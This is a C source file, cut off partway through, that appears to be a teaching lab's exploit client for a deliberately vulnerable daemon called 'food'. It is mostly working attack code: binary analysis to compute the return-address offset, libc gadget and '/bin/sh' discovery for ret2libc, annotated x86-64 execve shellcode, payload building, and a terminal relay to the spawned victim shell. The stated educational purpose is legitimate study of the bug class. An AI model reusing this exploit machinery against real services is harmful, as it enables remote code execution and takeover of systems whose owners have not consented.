/*
 * ============================================================================
 * fooc.c  --  "fooc": the companion exploit for the vulnerable daemon `food`
 * ============================================================================
 *
 *  PURPOSE
 *  -------
 *  `fooc` connects to `food`, reads the address leaks it publishes, builds a
 *  payload that overwrites the saved return address on `food`'s stack, and
 *  turns that into a root shell on the `food` host -- i.e. Remote Code
 *  Execution (RCE).
 *
 *  The point is to make the *mechanism* visible, step by step, so that when
 *  you later write your own software you recognise the bug class and reach for
 *  the right defence. Three techniques are implemented, in the order a real
 *  attacker would progress through them:
 *
 *    1. ret2win     Prove you can redirect execution by jumping to a function
 *                   that already exists in the binary. No leak needed.
 *    2. ret2libc    Call any libc function you like by name, because you know
 *                   where libc is loaded. Needs an information leak.
 *    3. shellcode   Put machine code in the buffer and jump to it. Needs a
 *                   leak to know where the buffer landed. This is the one the
 *                   brief asks for explicitly: real shellcode, executed.
 *
 *  Plus two diagnostic modes:
 *    leak          Just connect and print the leaks. No payload is sent.
 *    overflow-demo  Send junk long enough to smash the return address, and
 *                   watch the daemon die. Proves the bug exists.
 *
 *  THE ONE THING TO UNDERSTAND
 *  ---------------------------
 *  Everything below is a consequence of a single instruction. At the end of
 *  `food`'s vulnerable function, the CPU executes `ret`, which does this:
 *
 *      RIP = *(RSP)      // pop 8 bytes off the stack into the PC
 *      RSP = RSP + 8
 *
 *  Those 8 bytes live in the daemon's own stack frame, and an unbounded
 *  read() let the attacker write them. Everything after that sentence is
 *  just arithmetic about where to point them.
 *
 *  SAFETY
 *  ------
 *  Defaults to 127.0.0.1:2342, i.e. a daemon you started on your own
 *  machine. Point it at a real, unowned host and you are committing a
 *  computer intrusion offence. Don't.
 *
 *  Build:  make fooc
 *  Usage:  ./fooc [-h HOST] [-p PORT] [-b BINARY] [-t TECH] [-i] [-n] [-v]
 *
 *  THE SHELL IS ON THE VICTIM
 *  --------------------------
 *  Worth being blunt about, because it is the point people get wrong: after
 *  the payload lands there is exactly ONE shell in the whole picture, and it
 *  is running inside the victim's hijacked process with the TCP connection as
 *  its stdin/stdout. This program does not spawn a shell. It cannot, and it
 *  must not: see become_shell() for what happens when you try, and why the
 *  symptom is a missing byte rather than a missing shell.
 * ============================================================================
 */

/* glibc extensions we rely on: memmem(), dlsym(), MAP_ANONYMOUS, etc. */
#define _GNU_SOURCE

#include <arpa/inet.h>  /* inet_pton(): "127.0.0.1" -> 4 bytes.              */
#include <ctype.h>      /* isspace(), for trimming lines.                     */
#include <dlfcn.h>      /* dlsym(): find a function's address in our libc.    */
#include <errno.h>      /* errno / strerror().                                */
#include <fcntl.h>      /* open(), dup2(), O_NONBLOCK.                        */
#include <netinet/in.h> /* struct sockaddr_in, htons().                        */
#include <poll.h>       /* poll(): multiplex the terminal and the socket.      */
#include <stdint.h>     /* uint64_t and friends.                              */
#include <stdio.h>      /* printf and friends.                                */
#include <stdlib.h>     /* exit(), malloc(), strtoul().                       */
#include <string.h>     /* memcpy(), strstr(), memmem(), strcmp().            */
#include <sys/socket.h> /* socket(), connect(), shutdown() to half-close.    */
#include <sys/types.h>  /* ssize_t, pid_t.                                    */
#include <sys/wait.h>   /* Not used directly, but harmless and conventional.  */
#include <unistd.h>     /* read, write, close, dup2, execv, usleep, _exit.   */

/* ------------------------------------------------------------------------- */
/* Defaults                                                                  */
/* ------------------------------------------------------------------------- */

#define FOOC_HOST   "127.0.0.1"  /* Loopback. Please keep it that way.        */
#define FOOC_PORT   2342         /* Must match food's -p.                     */
#define FOOC_BIN    "./food"     /* The target binary, for static analysis.    */

/* Padding character for everything that is not a real address. 'A' (0x41) is
 * the traditional choice; it is not NULL, so it does not truncate anything and
 * it is instantly recognisable in a crash dump. */
#define PAD_BYTE    0x41

/* Upper bound on how many bytes of banner/leak text we will tolerate. */
#define RECV_MAX    4096

/* ------------------------------------------------------------------------- */
/* x86-64 shellcode                                                          */
/* ------------------------------------------------------------------------- */

/*
 * 23 bytes of machine code that do the whole job:
 *
 *      execve("/bin/sh", argv = NULL, envp = NULL)
 *
 * Hand-assembled, and byte-for-byte identical to shellcode.S in this
 * directory (run `make verify-shellcode` to prove that). Every instruction is
 * annotated:
 *
 *   31 f6                 xor    esi, esi          ; rsi = 0  (envp = NULL)
 *   31 d2                 xor    edx, edx          ; rdx = 0  (argv = NULL)
 *   48 bf 2f 62 69 6e     movabs rdi, 0x68732f6e69622f
 *   2f 73 68 00                             ; rdi = "/bin/sh\0" as 8 raw bytes
 *   57                    push   rdi              ; stack: "/bin/sh\0"
 *   48 89 e7              mov    rdi, rsp         ; rdi = &"/bin/sh" = argv[0]
 *   6a 3b                 push   0x3b             ; 59 = execve on x86-64
 *   58                    pop    rax              ; rax = 59 (syscall number)
 *   0f 05                 syscall                ; enter the kernel
 *
 * Why it is written this way, in detail:
 *
 *   * x86-64's calling convention (System V ABI) says the first three integer
 *     arguments go in rdi, rsi, rdx, and the syscall number in rax. execve
 *     needs exactly those, so we fill them in directly.
 *
 *   * The string constant is built with a single 8-byte `movabs` and then
 *     `push`ed, because `push imm64` does not exist on x86-64 -- the widest
 *     push-immediate is sign-extended to 32 bits. So we load 8 bytes into a
 *     register and push the register instead. The immediate 0x0068732f6e69622f
 *     is little-endian for the bytes 2f 62 69 6e 2f 73 68 00, which is
 *     "/bin/sh" followed by the NUL terminator that execve requires. We get
 *     the NUL "for free" because the 8th byte of the register is zero.
 *
 *   * `push 0x3b; pop rax` is the canonical way to load a small syscall number
 *     without a 7-byte `mov rax, imm64`.
 *
 *   * There is deliberately no `ret` and no `leave` at the end: execve
 *     replaces the entire process image and never returns. Anything after the
 *     `syscall` would only run if execve failed.
 *
 * WHY THIS IS THE MOST DANGEROUS BYTE SEQUENCE IN COMPUTING: those bytes are
 * architecture-independent *conceptually* but not in practice. They encode
 * literal x86-64 instructions with hardcoded register and syscall numbers, so
 * the payload is not portable, cannot pass an ABI's register-sanitising
 * checks, and any byte that happens to be 0x00 breaks tools that treat the
 * buffer as a C string. This is precisely why modern systems refuse to execute
 * the stack (NX) -- see the mitigation table in README.md.
 */
static const unsigned char SHELLCODE[] = {
    0x31, 0xf6,                          /* xor    esi, esi                   */
    0x31, 0xd2,                          /* xor    edx, edx                   */
    0x48, 0xbf, 0x2f, 0x62, 0x69,        /* movabs rdi, "/bin/sh" (low 4 bytes)*/
    0x6e, 0x2f, 0x73, 0x68, 0x00,        /* movabs rdi, "/bin/sh" (high 4)    */
    0x57,                                /* push   rdi                        */
    0x48, 0x89, 0xe7,                    /* mov    rdi, rsp                   */
    0x6a, 0x3b,                          /* push   0x3b  (execve)             */
    0x58,                                /* pop    rax                        */
    0x0f, 0x05                           /* syscall                           */
};
#define SHELLCODE_LEN ((int)(sizeof(SHELLCODE)))

/* ------------------------------------------------------------------------- */
/* Results of analysing the target binary                                     */
/* ------------------------------------------------------------------------- */

struct bininfo {
    unsigned long vuln_addr;    /* Address of food's vulnerable_handler().     */
    unsigned long win_addr;     /* Address of food's win() -- the ret2win goal.*/
    unsigned long frame_off;    /* buf's distance below rbp, from the disasm.  */
    unsigned long rip_off;      /* buf -> saved return address. THE key number.*/
    unsigned long ret_gadget;   /* Address of a bare `ret` instruction.        */
};

/* Results of introspecting our own (identical) libc. All of these are offsets
 * relative to libc's load address, so they transfer to the target unchanged
 * even though ASLR gave the two processes completely different bases. */
struct libcinfo {
    unsigned long base;         /* Where libc is mapped in *our* process.      */
    unsigned long off_system;   /* offset of system()                          */
    unsigned long off_read;     /* offset of read()   -- matches food's leak   */
    unsigned long off_binsh;    /* offset of the "/bin/sh" string               */
    unsigned long off_poprdi;   /* offset of a `pop rdi ; ret` gadget           */
};

/* What the target told us about itself. */
struct leaks {
    unsigned long stack;        /* A stack address from food (informational).  */
    unsigned long libc_read;    /* Address of read() inside food's libc.        */
    unsigned long buf;          /* Address of food's `buf`. The whole game.     */
};

/* ------------------------------------------------------------------------- */
/* Step 1: static analysis of the target binary via objdump                    */
/* ------------------------------------------------------------------------- */

/*
 * Why parse the disassembly instead of hardcoding "88"?
 *
 * Because 88 is a property of *this compilation*, not of the bug. Change the
 * optimiser, the flag set, or add a local variable, and the number changes.
 * Hardcoded offsets are the single most common reason a working exploit stops
 * working after a rebuild -- and, in the real world, a compiler or libc update
 * is a very cheap way to kill a lot of exploits at once. Computing it keeps
 * the exploit honest, and it is exactly what a real analyst does.
 *
 * The rule we implement, for a function compiled by GCC at -O0 on x86-64:
 *
 *   vulnerable_handler's prologue is
 *       push %rbp ; mov %rsp,%rbp ; sub $N,%rsp
 *   and the buffer is referenced as
 *       lea -OFF(%rbp), %reg        <- passed to read() as its 2nd argument
 *
 * so the buffer sits OFF bytes below the saved frame pointer, and the saved
 * return address is 8 bytes *above* it:
 *
 *   rip_off = OFF + 8
 */
static int analyse_binary(const char *path, struct bininfo *out)
{
    char cmd[512];      /* Shell command we are about to run.                 */
    char line[1024];    /* One line of objdump output at a time.               */
    FILE *pp;           /* Pipe to the objdump child process.                 */
    int in_vuln = 0;    /* "Are we currently inside vulnerable_handler?"      */
    int saw_read = 0;   /* "Have we already seen the call to read()?"         */
    int have_off = 0;   /* "Have we found the buffer's lea yet?"               */
    long best_off = 0;  /* Best candidate buffer offset seen so far.          */
    int status;         /* Exit status of the popen()'ed process.             */

    memset(out, 0, sizeof(*out));

    /*
     * The path is embedded in a shell command string, so quote it. (In real
     * code you would avoid popen() and posix_spawn() directly; here the goal
     * is legibility.) objdump is present because we use it to *build* the lab.
     */
    snprintf(cmd, sizeof(cmd), "objdump -d --no-show-raw-insn '%s' 2>/dev/null",
             path);

    pp = popen(cmd, "r");
    if (pp == NULL) {
        fprintf(stderr, "fooc: cannot run objdump: %s\n", strerror(errno));
        return -1;
    }

    /*
     * Walk the disassembly a line at a time. The stream is long (tens of
     * thousands of lines) so we deliberately do NOT slurp it all into memory;
     * reading a line at a time keeps fooc's own footprint tiny.
     */
    while (fgets(line, sizeof(line), pp) != NULL) {

        /* --- Function boundaries: lines look like "0000000000401535 <win>:" --- */
        if (strstr(line, "<vulnerable_handler>:") != NULL) {
            in_vuln = 1;
            sscanf(line, "%lx", &out->vuln_addr);
            continue;
        }

        if (strstr(line, "<win>:") != NULL) {
            sscanf(line, "%lx", &out->win_addr);
            continue;
        }

        /*
         * Any other "<something>:" label ends the vulnerable function. Keeping
         * this as "an unrecognised label" rather than "any label" is important,
         * because objdump also prints jump targets as "# 402080 <...>" mid-line.
         */
        if (in_vuln && strchr(line, '<') != NULL && strstr(line, ">:") != NULL) {
            in_vuln = 0;
            continue;
        }

        /*
         * Remember the first bare `ret` we see anywhere. It is used to build a
         * "ret sled" for the brute-force demo mode.
         *
         * Parsing detail: with --no-show-raw-insn each line looks like
         *     "  40101a:\tret"
         * i.e. address, a colon, whitespace, then the mnemonic. So we scan the
         * hex address, hop to the colon, skip whitespace, and require "ret"
         * to be a *whole* mnemonic -- otherwise "ret" would also match the
         * prefix of "repz retq" and, worse, a symbol name in a comment.
         */
        if (out->ret_gadget == 0) {
            unsigned long a = 0;
            const char *colon = strchr(line, ':');
            if (sscanf(line, "%lx", &a) == 1 && colon != NULL) {
                const char *p = colon + 1;
                while (*p == ' ' || *p == '\t')
                    p++;
                if (strncmp(p, "ret", 3) == 0 &&
                    (p[3] == '\0' || p[3] == '\n' ||
                     p[3] == ' ' || p[3] == '\t'))
                    out->ret_gadget = a;
            }
        }

        if (!in_vuln)
            continue;

        /* --- The vulnerable read() call: "call 401250 <read@plt>" --- */
        if (strstr(line, "<read@plt>") != NULL) {
            saw_read = 1;
            continue;
        }

        /*
         * The buffer reference: "lea    -0x50(%rbp),%rcx".
         *
         * We only accept a lea that (a) occurs *before* the call to read() and
         * (b) reaches deepest below rbp. Condition (a) is what disambiguates
         * `buf` from the other local array (`line`, at rbp-0xd0) whose address
         * is also computed with a lea later in the same function.
         *
         * sscanf on "%*[^0-9]" style masks keeps this readable; we just need
         * the -0xNN that appears immediately after "%rbp".
         */
        if (!saw_read && !have_off) {
            const char *p = strstr(line, "%rbp)");
            if (p != NULL && strstr(line, "lea") != NULL) {
                /* Back up over ",%rcx" etc. to find the '-0xNN' displacement. */
                const char *q = line;
                char disp[32];
                int  d = 0;
                while (q < p && *q != '-')
                    q++;
                if (q < p) {
                    const char *h = q;
                    while (h < p && d < (int)sizeof(disp) - 1) {
                        if (isxdigit((unsigned char)*h) || *h == '-' || *h == 'x' ||
                            *h == '+')
                            disp[d++] = *h++;
                        else
                            break;
                    }
                    disp[d] = '\0';
                    if (d > 0) {
                        /*
                         * The displacement in the disassembly is written
                         * "-0x50" to mean "50 bytes below rbp", but strtol
                         * faithfully returns -80. What we actually want is the
                         * *distance*, so take the absolute value here and
                         * document the sign at the point of use.
                         */
                        best_off = labs(strtol(disp, NULL, 0));
                        have_off = 1;   /* First one wins: that's `buf`.      */
                    }
                }
            }
        }
    }

    status = pclose(pp);
    (void)status;   /* We validate by checking we actually found things.     */

    if (out->vuln_addr == 0 || out->win_addr == 0 || !have_off) {
        fprintf(stderr,
                "fooc: could not fully analyse '%s'.\n"
                "       vuln=0x%lx win=0x%lx buf_off=%ld\n"
                "       Is this really the food binary? Is objdump installed?\n",
                path, out->vuln_addr, out->win_addr, best_off);
        return -1;
    }

    /*
     * THE key computation. buf lives `best_off` bytes below the saved frame
     * pointer; the saved return address is 8 bytes above that. So:
     */
    out->frame_off = (unsigned long)best_off;
    if (best_off < 0) {
        fprintf(stderr,
                "fooc: the buffer displacement parsed as %ld, which is not a\n"
                "       plausible distance below rbp. Refusing to guess.\n"
                "       (If food was rebuilt with a different optimiser, the\n"
                "        disassembly shape may have changed.)\n", best_off);
        return -1;
    }
    out->rip_off   = (unsigned long)best_off + 8UL;

    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 2: introspect our own libc to learn the offsets we will need          */
/* ------------------------------------------------------------------------- */

/*
 * The problem: the target's libc is at some address chosen by ASLR, and we do
 * not know it. But *our* libc is the very same file, mapped somewhere we can
 * discover, and its internal layout is identical.
 *
 * So the trick is: measure the *offsets* here, and add them to the target's
 * base. Concretely, if in our process `system` lives at
 *
 *      &system - libc_base
 *
 * and food leaked us its `read`, and we also know `read`'s offset, then
 *
 *      food_libc_base = food_read_addr - off_read
 *      food_system     = food_libc_base + off_system
 *
 * This delta-arithmetic trick is used by essentially every real-world
 * exploit, because it survives libc being updated as long as the offsets we
 * use are unchanged. It is also why "rebase the binaries" is a real and
 * effective mitigation: it moves the target's base, which invalidates every
 * offset the attacker measured.
 */
static int analyse_libc(struct libcinfo *out)
{
    FILE *f;                  /* /proc/self/maps.                              */
    char line[512];           /* One line of maps at a time.                    */
    unsigned long lo, hi;     /* Address range of the current mapping.          */
    unsigned long rx_lo = 0, rx_hi = 0;   /* libc's executable range.          */
    unsigned long ro_lo[32], ro_hi[32];  /* libc's read-only ranges.           */
    int n_ro = 0;             /* How many read-only ranges we collected.       */
    int memfd;                /* /proc/self/mem, for reading live memory.      */
    void *p;                  /* A generic pointer, for dlsym results.          */

    memset(out, 0, sizeof(*out));

    /* ---- 2a. Find libc's load address and its mapped ranges. ------------- */
    f = fopen("/proc/self/maps", "r");
    if (f == NULL) {
        fprintf(stderr, "fooc: cannot open /proc/self/maps: %s\n",
                strerror(errno));
        return -1;
    }

    while (fgets(line, sizeof(line), f) != NULL) {
        if (strstr(line, "libc.so.6") == NULL)
            continue;

        if (sscanf(line, "%lx-%lx", &lo, &hi) != 2)
            continue;

        /*
         * The *lowest* libc mapping is the load base. The kernel maps a shared
         * object with several separate segments (r--p, r-xp, r--p, rw-p), and
         * the base is where the first one starts.
         */
        if (out->base == 0 || lo < out->base)
            out->base = lo;

        /* Executable text: where gadgets and real functions live. */
        if (strstr(line, "r-xp") != NULL) {
            rx_lo = lo;
            rx_hi = hi;
        }

        /* Read-only data: where string constants like "/bin/sh" live. */
        if (strstr(line, "r--p") != NULL && n_ro < 32) {
            ro_lo[n_ro] = lo;
            ro_hi[n_ro] = hi;
            n_ro++;
        }
    }
    fclose(f);

    if (out->base == 0 || rx_hi == 0) {
        fprintf(stderr, "fooc: could not locate libc in /proc/self/maps\n");
        return -1;
    }

    /* ---- 2b. Ask the dynamic linker for two function offsets. ----------- */
    /*
     * dlsym(RTLD_DEFAULT, ...) searches the global symbol scope and returns an
     * absolute runtime address. Subtracting the base yields the portable
     * offset. (We deliberately do NOT hardcode 0x54530 for system(): that
     * number is specific to glibc 2.44 and would break on any other build.)
     */
    p = dlsym(RTLD_DEFAULT, "system");
    if (p == NULL) { fprintf(stderr, "fooc: no system()\n"); return -1; }
    out->off_system = (unsigned long)p - out->base;

    p = dlsym(RTLD_DEFAULT, "read");
    if (p == NULL) { fprintf(stderr, "fooc: no read()\n"); return -1; }
    out->off_read = (unsigned long)p - out->base;

    /* ---- 2c. Read our own libc text out of memory and hunt for gadgets. -- */
    memfd = open("/proc/self/mem", O_RDONLY);
    if (memfd < 0) {
        fprintf(stderr, "fooc: cannot open /proc/self/mem: %s\n",
                strerror(errno));
        return -1;
    }

    /*
     * `pop rdi ; ret` is the two-byte sequence 5f c3. It is the gadget that
     * makes ret2libc work: it lets us "pass" the first function argument.
     * There is no equivalent in `food` itself at -O0, which is why we borrow
     * one from libc.
     *
     * Note we search the *mapped memory*, not the file on disk. A file offset
     * and a virtual address are not interchangeable -- shared objects are
     * mapped at a page-aligned base and the first executable segment is
     * typically a whole page (4 KiB) further on than its file offset suggests.
     */
    {
        size_t sz = (size_t)(rx_hi - rx_lo);
        unsigned char *text = malloc(sz);
        if (text == NULL) { close(memfd); return -1; }

        if (pread(memfd, text, sz, (off_t)rx_lo) == (ssize_t)sz) {
            unsigned char *hit = memmem(text, sz, "\x5f\xc3", 2);
            if (hit != NULL) {
                /* Convert "offset within this segment" to "offset from base". */
                out->off_poprdi = (unsigned long)(hit - text)
                                  + (rx_lo - out->base);
            }
        }
        free(text);
    }

    /* ---- 2d. Hunt for the "/bin/sh" string constant. ------------------- */
    /*
     * Rather than hardcode its offset (it moves between glibc versions), we
     * scan the read-only segments for the literal bytes. The first match is
     * the canonical one -- the very first "/bin/sh" in .rodata -- and it works
     * because it is passed to execve/system as argv[0].
     */
    for (int i = 0; i < n_ro && out->off_binsh == 0; i++) {
        size_t sz = (size_t)(ro_hi[i] - ro_lo[i]);
        unsigned char *ro = malloc(sz);
        if (ro == NULL)
            break;
        if (pread(memfd, ro, sz, (off_t)ro_lo[i]) == (ssize_t)sz) {
            unsigned char *hit = memmem(ro, sz, "/bin/sh", 7);
            if (hit != NULL)
                out->off_binsh = (unsigned long)(hit - ro)
                                 + (ro_lo[i] - out->base);
        }
        free(ro);
    }

    close(memfd);

    if (out->off_poprdi == 0 || out->off_binsh == 0) {
        fprintf(stderr,
                "fooc: failed to locate gadgets/strings in libc "
                "(pop-rdi-ret=0x%lx /bin/sh=0x%lx)\n",
                out->off_poprdi, out->off_binsh);
        return -1;
    }

    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 3: networking                                                         */
/* ------------------------------------------------------------------------- */

/*
 * connect_to() -- open a TCP connection to host:port. Textbook, and correct.
 *
 * We connect to 127.0.0.1 by default, so this lab never leaves the machine
 * unless you deliberately point -h somewhere else.
 */
static int connect_to(const char *host, int port)
{
    struct sockaddr_in sa;    /* The address we will connect to.               */
    int fd;                   /* The socket.                                   */
    int one = 1;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        fprintf(stderr, "fooc: socket: %s\n", strerror(errno));
        return -1;
    }
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) != 1) {
        fprintf(stderr, "fooc: bad address '%s'\n", host);
        close(fd);
        return -1;
    }

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, "fooc: connect %s:%d: %s\n", host, port, strerror(errno));
        close(fd);
        return -1;
    }
    return fd;
}

/*
 * send_all() -- write the whole buffer, looping over short writes.
 * A stream socket accepts a partial write at any time; assuming otherwise is a
 * classic source of flaky exploits.
 */
static int send_all(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;    /* Walk the buffer as we send.         */
    size_t sent = 0;                 /* Bytes handed to the kernel so far.   */
    while (sent < n) {
        ssize_t w = write(fd, p + sent, n - sent);
        if (w < 0) {
            if (errno == EINTR)
                continue;            /* Signal: retry the same bytes.         */
            return -1;
        }
        sent += (size_t)w;
    }
    return 0;
}

/*
 * write_nb() -- write the whole buffer to a descriptor that may be
 * non-blocking, retrying on EAGAIN.
 *
 * send_all() above assumes a blocking descriptor, which is true while we are
 * blasting the payload. The relay loop cannot use it: it deliberately sets
 * O_NONBLOCK so poll() stays responsive, and a non-blocking write() is allowed
 * to accept only part of the buffer, or none of it, purely because the kernel's
 * buffer is momentarily full. Retrying on EAGAIN is what makes a short write a
 * non-event rather than a silent truncation of the user's keystrokes.
 */
static int write_nb(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;
    size_t sent = 0;

    while (sent < n) {
        ssize_t w = write(fd, p + sent, n - sent);
        if (w > 0) {
            sent += (size_t)w;
            continue;
        }
        if (w < 0 && (errno == EINTR))
            continue;                    /* Retry the same bytes.            */
        if (w < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            /* Wait for the descriptor to drain, then try again. */
            struct pollfd p;
            p.fd = fd;
            p.events = POLLOUT;
            p.revents = 0;
            if (poll(&p, 1, 1000) <= 0 && errno != EINTR)
                return -1;               /* Timed out: treat as failure.      */
            continue;
        }
        return -1;                       /* Real error.                       */
    }
    return 0;
}

/*
 * read_until() -- read from the socket until we have seen every pattern in
 * `pats`, or until RECV_MAX bytes / a timeout.
 *
 * Why not a simple line-based protocol? Because we do not fully control the
 * daemon's output format, and a robust client should not assume it. This
 * accumulates bytes and re-scans the whole buffer after each read, which is
 * simple and immune to the banner being split across TCP segments -- a real
 * and frequently-missed detail.
 */
static int read_until(int fd, const char *const *pats, int npats, char *out,
                      size_t outsz)
{
    size_t got = 0;                  /* Bytes collected so far.               */
    int missing = npats;             /* How many patterns we have not seen.   */

    while (missing > 0 && got + 1 < outsz && got < RECV_MAX) {
        ssize_t r = read(fd, out + got, outsz - got - 1);
        if (r <= 0) {
            if (r < 0 && errno == EINTR)
                continue;
            break;                   /* EOF or error: stop, use what we got.  */
        }
        got += (size_t)r;
        out[got] = '\0';

        /* Re-count which patterns are present. */
        missing = 0;
        for (int i = 0; i < npats; i++)
            if (strstr(out, pats[i]) == NULL)
                missing++;
    }

    out[got < outsz ? got : outsz - 1] = '\0';
    return (missing == 0) ? 0 : -1;
}

/*
 * parse_leaks() -- pull the three hex addresses out of the daemon's banner.
 *
 * The daemon prints, in order:
 *     FOOD 1.0 leak stack=0x... libc=0x...
 *     BUF=0x...
 *
 * strstr finds each key, then strtoul with base 0 parses the "0x..." that
 * follows. strtoul with base 0 auto-detects hex vs decimal vs octal, which
 * is the right default when the input is untrusted.
 */
static int parse_leaks(const char *text, struct leaks *out)
{
    const char *p;

    memset(out, 0, sizeof(*out));

    if ((p = strstr(text, "stack=")) != NULL)
        out->stack = strtoul(p + 6, NULL, 0);
    if ((p = strstr(text, "libc=")) != NULL)
        out->libc_read = strtoul(p + 5, NULL, 0);
    if ((p = strstr(text, "BUF=")) != NULL)
        out->buf = strtoul(p + 4, NULL, 0);

    if (out->libc_read == 0 || out->buf == 0) {
        fprintf(stderr,
                "fooc: the daemon did not leak what we expected.\n"
                "       stack=0x%lx libc=0x%lx BUF=0x%lx\n"
                "       Did you run the current ./food? Is it v1.0?\n",
                out->stack, out->libc_read, out->buf);
        return -1;
    }
    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 4: payload construction                                               */
/* ------------------------------------------------------------------------- */

/* A growable byte buffer, so we can build a payload without a fixed cap. */
struct pbuf {
    unsigned char *data;
    size_t         len;
    size_t         cap;
};

static int pbuf_reserve(struct pbuf *p, size_t extra)
{
    if (p->len + extra <= p->cap)
        return 0;                   /* Already have room.                       */
    size_t ncap = p->cap ? p->cap * 2 : 256;
    while (ncap < p->len + extra)
        ncap *= 2;
    unsigned char *nd = realloc(p->data, ncap);
    if (nd == NULL)
        return -1;
    p->data = nd;
    p->cap  = ncap;
    return 0;
}

/* Append a single byte. */
static int pbuf_u8(struct pbuf *p, unsigned char b)
{
    if (pbuf_reserve(p, 1) < 0)
        return -1;
    p->data[p->len++] = b;
    return 0;
}

/*
 * Append a 64-bit little-endian word.
 *
 * x86-64 is little-endian, so this is simply the 8 bytes of the value in
 * memory order. Writing them by hand (rather than memcpy'ing a uint64_t) is
 * deliberate: it makes the byte order explicit, and it is correct on any host
 * you compile on -- so the exploit can be built on one machine and fired from
 * another, which matters for a portable tool.
 */
static int pbuf_u64(struct pbuf *p, unsigned long v)
{
    for (int i = 0; i < 8; i++)
        if (pbuf_u8(p, (unsigned char)((v >> (8 * i)) & 0xffUL)) < 0)
            return -1;
    return 0;
}

/* Append N padding bytes. */
static int pbuf_pad(struct pbuf *p, size_t n)
{
    if (pbuf_reserve(p, n) < 0)
        return -1;
    memset(p->data + p->len, PAD_BYTE, n);
    p->len += n;
    return 0;
}


/* ------------------------------------------------------------------------- */
/* Step 5: the shell                                                         */
/* ------------------------------------------------------------------------- */

/*
 * drain_hint() -- non-blockingly print anything the daemon already said.
 *
 * A failed exploit produces a diagnostic ("no hijack") and a closed socket.
 * We want to show that text *before* handing the terminal to /bin/sh, rather
 * than letting it scroll away or be eaten as if it were shell output.
 */
static void drain_hint(int fd)
{
    char buf[1024];
    int flags = fcntl(fd, F_GETFL, 0);       /* Remember blocking state.     */
    ssize_t n;

    if (flags == -1)
        return;
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);   /* Switch to non-blocking.      */

    n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = '\0';
        fputs(buf, stdout);                   /* Show the daemon's last word. */
        fflush(stdout);
    }

    fcntl(fd, F_SETFL, flags);                /* Restore blocking.            */
}

/*
 * relay_stdio() -- splice the real terminal and the network socket together.
 *
 * Runs in a forked child, and multiplexes both directions with poll():
 *
 *   terminal -> socket : the user's keystrokes
 *   socket -> terminal : the victim shell's output
 *
 * WHY ONE PROCESS AND NOT TWO
 * ---------------------------
 * The textbook version forks twice, giving each direction its own blocking
 * copy loop. That works, and it was the first version of this code -- but two
 * processes writing to the same terminal interleave their output at
 * arbitrary boundaries, so a `4096`-byte write from one could land in the
 * middle of a line from the other. In practice you get mangled output like
 *
 *     7-artix1-1
 *     inux 7.2.7-artix1-1
 *
 * where a single `uname` line has been cut in half and the pieces printed
 * twice. A single poll() loop is strict alternation -- one descriptor is
 * serviced to completion before the next is looked at -- so output stays in
 * order and the interleaving bug cannot exist.
 *
 * The trade-off is that poll() on a *blocking* descriptor can still stall one
 * direction behind the other, so both descriptors must be non-blocking; poll()
 * then tells us which has data instead of us guessing. That is the standard
 * multiplexing shape and it is correct here because we are not waiting for
 * protocol semantics, just for bytes to move.
 *
 * SIGINT/SIGQUIT: the shell runs in the other process, so Ctrl-C typed at the
 * terminal is forwarded as a *byte* (0x03) to the remote shell rather than
 * being delivered to us as a signal. That is the correct behaviour -- the
 * victim should be the one interrupted -- but it means this process has
 * nothing to stop it, so the loop ends on EOF instead.
 */
static void relay_stdio(int sock)
{
    struct pollfd pfd[2];
    char buf[4096];
    int saved[2] = { -1, -1 };    /* Original blocking flags, to restore.    */
    int saved_sock;                /* Ditto for the socket.                   */

    /* Both ends must be non-blocking, or poll() would block in the read()
     * rather than returning control to us. save/restore keeps the socket's
     * mode intact for the shell process, which still expects a normal socket. */
    for (int i = 0; i < 2; i++) {
        saved[i] = fcntl(i, F_GETFL, 0);
        if (saved[i] != -1)
            fcntl(i, F_SETFL, saved[i] | O_NONBLOCK);
    }
    saved_sock = fcntl(sock, F_GETFL, 0);
    if (saved_sock != -1)
        fcntl(sock, F_SETFL, saved_sock | O_NONBLOCK);

    pfd[0].fd = STDIN_FILENO;   /* our terminal  */
    pfd[0].events = POLLIN;
    pfd[1].fd = sock;           /* the network   */
    pfd[1].events = POLLIN;

    for (;;) {
        int n = poll(pfd, 2, -1);        /* -1: block until something moves. */
        ssize_t r;

        if (n < 0) {
            if (errno == EINTR)
                continue;                /* a signal is not an error here.   */
            break;
        }
        if (n == 0)
            continue;

        if (pfd[0].revents & POLLIN) {
            r = read(STDIN_FILENO, buf, sizeof(buf));
            if (r > 0) {
                if (write_nb(sock, buf, (size_t)r) < 0)
                    break;
            } else if (r == 0) {
                /*
                 * Terminal EOF: the user pressed Ctrl-D, or the test harness
                 * closed the pty. Half-close the socket so the remote shell
                 * sees end-of-input and exits on its own terms rather than
                 * hanging until we are killed. A plain close() would not do:
                 * the socket is shared with the shell process, and closing it
                 * here would yank the terminal out from under it.
                 */
                shutdown(sock, SHUT_WR);
                break;
            }
        }

        if (pfd[1].revents & (POLLIN | POLLHUP | POLLERR)) {
            r = read(sock, buf, sizeof(buf));
            if (r > 0) {
                if (write_nb(STDOUT_FILENO, buf, (size_t)r) < 0)
                    break;
            } else {
                break;                  /* EOF or error: session is over.   */
            }
        }
    }

    /* Put the descriptors back the way we found them. This process is about
     * to _exit(), so strictly it does not matter -- but the socket is shared
     * with the shell in the parent, and leaving a surprise behind in shared
     * state is exactly the habit that turns into a real bug in real code. */
    for (int i = 0; i < 2; i++)
        if (saved[i] != -1)
            fcntl(i, F_SETFL, saved[i]);
    if (saved_sock != -1)
        fcntl(sock, F_SETFL, saved_sock);
}

/*
 * become_shell() -- sit between the user's terminal and the victim shell.
 *
 * WHERE THE SHELL ACTUALLY IS
 * ---------------------------
